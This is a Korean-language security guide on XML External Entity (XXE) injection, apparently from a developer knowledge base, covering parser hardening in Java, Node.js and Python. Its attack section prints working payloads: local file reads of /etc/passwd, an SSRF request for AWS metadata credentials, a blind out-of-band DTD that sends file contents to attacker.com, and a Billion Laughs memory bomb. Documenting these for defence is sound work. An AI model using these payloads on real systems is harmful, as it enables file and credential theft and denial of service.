---
title: XXE (XML External Entity) 주입
tags:
  - Security
  - XXE
  - XML
  - SSRF
  - Java
  - Node.js
  - Python
updated: 2026-06-23
---

# XXE (XML External Entity) 주입

XML을 받아서 파싱하는 코드가 있으면 XXE를 한 번은 의심해야 한다. JSON이 대세가 된 지 오래라 "우리는 XML 안 써요"라고 말하는 사람이 많은데, 막상 까보면 SOAP 연동, SAML 인증, SVG 업로드, 엑셀(`.xlsx`)·워드(`.docx`) 같은 OOXML 문서 파싱, 도면 파일 등 XML이 숨어 들어오는 경로가 생각보다 많다. 파서가 기본 설정 그대로면 그 경로 전부가 공격면이 된다.

핵심은 XML 표준에 들어있는 DTD(Document Type Definition)와 외부 엔티티(External Entity) 기능이다. 이 기능을 쓰는 서비스는 거의 없는데, 파서는 대부분 기본으로 켜놓는다. 공격자가 페이로드에 외부 엔티티를 박아 넣으면 파서가 친절하게 로컬 파일을 읽어 오거나 내부망으로 요청을 날린다.

SSRF로 번지는 부분은 [SSRF](./SSRF.md) 문서와 겹치는데, 여기서는 XML 파서가 어떻게 그 통로가 되는지에 집중한다.

## DTD와 엔티티가 뭔데 위험한가

엔티티는 XML 안에서 쓰는 일종의 치환 변수다. `&lt;` 같은 게 내장 엔티티고, DTD에서 직접 선언할 수도 있다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY company "ACME Corp">
]>
<note>&company;에서 보냄</note>
```

`&company;`가 `ACME Corp`로 치환된다. 여기까지는 문자열 치환이라 별 문제가 없다. 문제는 엔티티 값을 외부 리소스에서 가져올 수 있게 한 외부 엔티티다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<note>&xxe;</note>
```

`SYSTEM` 키워드 뒤의 URI를 파서가 그대로 읽어서 `&xxe;` 자리에 넣는다. 파서가 외부 엔티티를 막지 않으면, 위 XML을 던졌을 때 응답 어딘가에 `/etc/passwd` 내용이 섞여 나온다. 공격자가 보낸 DTD를 파서가 신뢰하고 실행해 버리는 게 문제의 본질이다.

## 실제로 뭘 할 수 있나

### 로컬 파일 노출 (file://)

가장 흔한 형태다. `file://` 스킴으로 서버의 임의 파일을 읽는다.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><user>&xxe;</user></data>
```

설정 파일(`application.yml`, `.env`), 비밀키(`/root/.ssh/id_rsa`), 클라우드 메타데이터 토큰 등 읽히면 곤란한 게 한둘이 아니다. 파싱 결과를 화면이나 응답으로 되돌려주는 API라면 파일 내용이 바로 노출된다.

한 가지 주의할 점이 있다. `file://`로 읽은 내용에 `<`, `&` 같은 XML 특수문자가 들어있으면 파싱이 깨진다. `/etc/passwd`처럼 평범한 텍스트는 잘 읽히지만, XML 구조를 가진 파일이나 바이너리는 그냥 읽으면 에러가 난다. 공격자는 이럴 때 뒤에 나오는 블라인드 방식이나 PHP 환경이면 `php://filter`로 base64 인코딩을 끼워 우회한다.

### SSRF로 확장

`file://` 대신 `http://`를 쓰면 서버가 임의 주소로 요청을 보낸다. 이게 XXE를 통한 SSRF다.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

AWS 메타데이터 엔드포인트(`169.254.169.254`)를 찌르는 전형적인 페이로드다. IMDSv1을 쓰는 환경이면 임시 자격증명이 그대로 털린다. 내부망 포트 스캔, 외부에 안 열린 관리 API 호출도 같은 방식으로 가능하다. SSRF 자체의 방어는 [SSRF](./SSRF.md) 문서를 보면 되고, 여기서 막아야 할 건 "XML 파서가 네트워크 요청을 보내게 두지 않는 것"이다.

### 블라인드 XXE (OOB)

응답에 파싱 결과가 안 실리는 경우, 즉 파일 내용을 직접 못 보는 상황에서도 데이터를 빼낼 수 있다. 외부에 올려둔 공격자 DTD를 불러오고, 그 안에서 읽은 파일 내용을 쿼리스트링에 실어 공격자 서버로 다시 요청을 보내는 방식이다. OOB(Out-of-Band) 채널이라고 부른다.

요청 본문에 들어가는 XML:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<data>test</data>
```

`attacker.com/evil.dtd` 내용:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%wrapper;
%exfil;
```

`%`로 시작하는 건 파라미터 엔티티로, DTD 내부에서만 쓰인다. 파일을 읽어 `%file`에 담고, 그 값을 다시 URL에 실어 공격자 서버로 보낸다. 공격자는 자기 서버 액세스 로그에서 `?d=...`를 확인하면 된다. 응답을 안 돌려줘도 데이터가 새기 때문에, "결과를 안 보여주니 안전하다"는 가정은 틀렸다.

### 빌리언 래프 (Billion Laughs) DoS

파일을 읽는 대신 메모리를 터뜨리는 공격이다. 엔티티가 엔티티를 참조하도록 중첩시켜 기하급수적으로 문자열을 부풀린다.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

`lol9` 하나가 `lol`을 10억 개(10^9) 펼친다. 수백 바이트짜리 요청 하나로 수 GB 메모리를 잡아먹고 프로세스가 죽는다. 외부 네트워크나 파일 접근 없이 내부 엔티티만으로 되기 때문에, `file://`·`http://`를 다 막아도 DTD 처리 자체를 막지 않으면 이건 그대로 통한다. 그래서 외부 엔티티 차단과 별개로 DTD(DOCTYPE) 선언 자체를 거부하는 게 가장 확실하다.

## 언어별 방어 설정

방어 원칙은 하나다. 안 쓰는 기능을 끈다. DOCTYPE을 아예 막을 수 있으면 막고, 호환성 때문에 DTD를 살려야 하면 외부 엔티티와 외부 DTD 로딩만이라도 끈다.

### Java — DocumentBuilderFactory / SAXParserFactory

Java의 XML 파서는 기본값이 위험한 쪽으로 맞춰져 있다. 그래서 팩토리를 만들 때마다 명시적으로 꺼줘야 한다. 가장 깔끔한 건 `disallow-doctype-decl`을 켜서 DOCTYPE 자체를 막는 것이다.

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.XMLConstants;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// DOCTYPE 선언 자체를 거부 — 이거 하나면 XXE와 빌리언 래프 다 막힌다
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// DOCTYPE을 꼭 허용해야 하는 경우엔 최소한 아래 두 개라도
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// 외부 DTD 로딩 차단
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// XInclude, 엔티티 확장 방지 보강
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// JAXP 1.5 이상이면 외부 접근 프로토콜을 통째로 비움
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

`SAXParserFactory`, `XMLInputFactory`(StAX), `TransformerFactory`, `SchemaFactory`도 각각 비슷한 설정이 필요하다. 실무에서 자주 빠뜨리는 게 이 부분이다. `DocumentBuilderFactory`만 잠그고 다른 데서 `SAXParser`나 `Transformer`를 그냥 쓰면 거기로 뚫린다. 코드베이스에서 `Factory.newInstance()`를 전부 찾아 점검해야 한다.

StAX의 경우:

```java
import javax.xml.stream.XMLInputFactory;

XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

Spring을 쓰면 `Jaxb2Marshaller`나 SOAP(`spring-ws`) 쪽 파서가 내부적으로 XML을 다룬다. `spring-ws`는 비교적 최신 버전에서 외부 엔티티를 막아두지만, 버전이 오래됐거나 커스텀 `SAXSource`를 직접 만들어 넘기면 위험하다. 라이브러리에 맡기지 말고 실제로 페이로드를 던져 확인하는 게 낫다.

### Node.js — libxmljs / fast-xml-parser

Node 진영은 XML 파싱 라이브러리가 여럿이다. 순수 JS 파서(`fast-xml-parser`, `xml2js`)는 대부분 DTD·외부 엔티티를 아예 처리하지 않아서 XXE에 비교적 안전하다. 문제는 libxml2를 바인딩한 `libxmljs`(`libxmljs2`)다. 이쪽은 C 라이브러리 기능을 그대로 노출하기 때문에 옵션을 줘야 한다.

```js
const libxmljs = require('libxmljs2');

// noent를 켜면 엔티티를 치환한다 — 즉 noent: true가 위험하다. 기본값(false) 유지.
// nonet으로 네트워크 접근을 막고, 외부 DTD 로딩을 끈다.
const doc = libxmljs.parseXml(xmlString, {
  noent: false,   // 엔티티 치환 비활성 (기본값이지만 명시)
  noblanks: false,
  nonet: true,    // 네트워크를 통한 외부 리소스 로딩 차단
  dtdload: false, // 외부 DTD 로딩 차단
  dtdvalid: false,
});
```

`noent` 옵션 이름이 헷갈린다. "no entity"처럼 보여서 엔티티를 막는 줄 알고 `true`로 켜는 실수가 잦은데, 실제로는 엔티티를 치환(substitute)하라는 뜻이다. `noent: true`로 두면 XXE가 그대로 동작한다. 반드시 `false`(기본값)여야 한다.

가능하면 DTD가 필요 없는 워크로드에서는 순수 JS 파서로 갈아타는 걸 권한다. `fast-xml-parser`는 기본 설정에서 DTD 엔티티를 확장하지 않는다.

```js
const { XMLParser } = require('fast-xml-parser');

const parser = new XMLParser({
  processEntities: true,   // 표준 내장 엔티티(&amp; 등)만 처리
  // 커스텀 DTD 엔티티는 기본적으로 확장 안 됨
});
```

### Python — lxml / ElementTree

표준 라이브러리 `xml.etree.ElementTree`는 비교적 안전한 축에 든다. 최신 Python의 기본 파서(`expat`)는 외부 엔티티를 가져오지 않는다. 다만 빌리언 래프 같은 엔티티 확장 DoS는 버전과 설정에 따라 여전히 취약할 수 있다.

문제가 되는 건 `lxml`이다. 기본 파서가 DTD를 처리하고, `resolve_entities`가 켜져 있으면 외부 엔티티를 가져온다. 안전하게 쓰려면 파서를 직접 만들어 옵션을 잠가야 한다.

```python
from lxml import etree

# 안전한 파서 구성
parser = etree.XMLParser(
    resolve_entities=False,   # 엔티티 치환 차단 (XXE 핵심 방어)
    no_network=True,          # 네트워크 접근 차단 (SSRF·OOB 차단)
    dtd_validation=False,
    load_dtd=False,           # 외부 DTD 로딩 차단
    huge_tree=False,          # 거대 트리 방지 (DoS 완화)
)

tree = etree.fromstring(xml_bytes, parser=parser)
```

`resolve_entities=False`만으로 `file://`·`http://` 외부 엔티티는 막힌다. `no_network=True`까지 주면 OOB·SSRF 경로가 닫힌다. 빌리언 래프류는 `lxml`이 엔티티 확장 횟수를 자체 제한해서 기본적으로 어느 정도 막아주지만, `huge_tree=False`(기본값)를 유지해야 한다.

더 확실하게 가려면 `defusedxml` 라이브러리를 쓴다. 표준 파서들을 안전한 기본값으로 감싸둔 래퍼라, 기존 코드의 import만 바꾸면 된다.

```python
# 기존: from lxml import etree
from defusedxml.lxml import fromstring

# 기존: import xml.etree.ElementTree as ET
import defusedxml.ElementTree as ET

tree = fromstring(xml_bytes)  # DTD·외부 엔티티·엔티티 폭탄 차단
```

신규 코드라면 `defusedxml`을 기본 선택지로 두는 게 고민할 거리를 줄인다.

## 실무에서 XXE가 숨어드는 경로

### SOAP / XML API

레거시 연동이 SOAP면 요청·응답 전부 XML이다. 게이트웨이나 어댑터 단에서 들어온 XML을 파싱하는데, 이 파서가 안 잠겨 있으면 외부 파트너가 보낸 SOAP 메시지에 XXE를 실어 보낼 수 있다. WSDL 처리 과정에서도 외부 스키마를 로딩하다 뚫리는 경우가 있다. SOAP 스택 라이브러리만 믿지 말고 버전을 확인하고 직접 페이로드를 테스트해야 한다.

### SVG 업로드

SVG는 XML 기반 이미지 포맷이다. 프로필 이미지나 아이콘 업로드에서 SVG를 허용하면 그 자체가 XML 입력 통로가 된다. 업로드된 SVG를 서버에서 썸네일로 변환하거나 메타데이터를 뽑으려고 파싱하면 XXE가 발동한다. 이미지 처리 라이브러리(ImageMagick 등)도 내부적으로 SVG의 외부 참조를 따라가다 SSRF로 번진 사례가 많다. SVG 업로드는 가능하면 막고, 꼭 받아야 하면 파싱 전에 DOCTYPE이 들어있는지부터 거른다. SVG는 [File_Upload_Security](./File_Upload_Security.md)에서도 다룬다.

### 오피스 문서 (xlsx, docx, pptx)

`.xlsx`, `.docx`는 사실 XML 파일 여러 개를 zip으로 묶은 것(OOXML)이다. 엑셀 업로드 받아서 서버에서 파싱하는 기능, 흔하다. Apache POI 같은 라이브러리가 압축을 풀고 내부 XML을 읽는데, 라이브러리나 그게 쓰는 하위 파서가 외부 엔티티를 막지 않으면 악성 문서로 XXE가 터진다. 최신 POI는 막아두지만 옛 버전은 취약하다. 라이브러리 버전을 올리는 게 1차 방어다.

### 점검 방법

코드 리뷰에서는 XML을 파싱하는 지점을 전부 찾는 게 먼저다. Java면 `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SAXReader`(dom4j), `Unmarshaller`를, Node면 `libxmljs`를, Python이면 `lxml`·`etree`를 코드베이스에서 grep으로 훑는다.

동작 점검은 실제 페이로드를 던져본다. 먼저 응답에 결과가 실리는지 보고, 안 실리면 블라인드를 의심한다. 블라인드 확인은 본인이 제어하는 외부 서버(또는 Burp Collaborator 같은 OOB 도구)를 띄워두고, 외부 DTD를 불러오는 페이로드를 보낸 뒤 그 서버에 요청이 들어오는지 본다.

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % p SYSTEM "http://본인서버.example/probe">
  %p;
]>
<test>ping</test>
```

본인 서버 로그에 `/probe` 요청이 찍히면 외부 엔티티가 살아있다는 뜻이고, 그 경로는 XXE에 노출된 거다. 응답 본문에 파일 내용이 안 보여도 이 OOB 테스트는 통과시켜선 안 된다. 파싱 에러가 나도 마찬가지인데, 파서가 엔티티를 먼저 펼치다 에러를 내는 경우 이미 외부 요청은 나간 뒤이기 때문이다.

운영 환경에서는 WAF로 `<!DOCTYPE`, `<!ENTITY` 문자열을 거르는 보완책을 둘 수 있지만, 인코딩 우회가 가능해서 이것만 믿으면 안 된다. 근본 방어는 파서 설정이다. 들어오는 XML이 어디서 와서 어떤 파서를 거치는지 한 번 정리해두면, 새 기능을 붙일 때 같은 실수를 반복하지 않는다.
